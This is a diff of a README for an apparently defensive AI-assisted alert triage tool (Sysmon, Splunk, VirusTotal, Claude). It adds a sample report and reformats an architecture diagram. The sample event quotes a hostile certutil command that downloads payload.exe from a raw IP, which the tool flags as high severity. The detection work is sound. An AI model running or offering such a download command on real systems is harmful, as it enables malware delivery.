@@ -33,6 +33,7 @@ command line alone.
 For a `certutil` download from a known-malicious IP, the tool enriches the
 indicators and the LLM escalates appropriately:
 
+```
 EVENT 2 — T1105
 Command: certutil -urlcache -split -f http://185.220.101.5/payload.exe evil.exe
 Threat Intel: IP: 9 vendors flagged as malicious | Hash: 65 vendors flagged as malicious
@@ -42,17 +43,21 @@ SEVERITY: HIGH — hash flagged by 65 vendors, source IP by 9, trusted
 binary abused to evade defenses.
 RECOMMENDED ACTION: Isolate host, escalate to Tier 2/IR, block the IP,
 preserve artifacts, review user activity across the environment.
+```
 
-<!-- Add a screenshot of your real terminal output here -->
+<img width="1912" height="961" alt="AI triage assistant output showing enrichment and LLM triage" src="https://github.com/user-attachments/assets/9f0076c2-12c5-4265-bfce-59f073e074db" />
 
 ---
 
 ## Architecture
+
+```
 Windows host (Sysmon) ──► Splunk ──► triage.py
-│
-├─ enrich indicators (VirusTotal)
-├─ AI triage (Claude)
-└─ write triage report
+                                        │
+                                        ├─ enrich indicators (VirusTotal)
+                                        ├─ AI triage (Claude)
+                                        └─ write triage report
+```
 
 Current version reads events from a JSON file (demo mode). A live version that
 pulls events directly from Splunk's REST API is the next planned phase.
